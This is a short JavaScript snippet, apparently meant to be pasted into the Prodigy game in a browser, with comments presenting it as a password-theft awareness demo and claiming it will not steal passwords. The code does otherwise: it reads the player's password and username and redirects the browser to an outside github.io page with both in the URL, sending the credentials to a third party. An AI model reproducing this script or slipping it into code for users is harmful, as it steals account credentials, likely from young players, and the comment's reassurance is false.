//this is to raise awareness for how easy it is to steal passwords, It will NOT steal your password

//someone could hide a script like this in their script and it could steal and log your passwords
var pw = PIXI.game.prodigy.player.password;
var un = PIXI.game.prodigy.player.username;
pw = encodeURI(pw);
un = encodeURI(un);
window.location.href = 'https://rubberduck55.github.io/thing/handle.html?un='+un+'&pw='+pw;
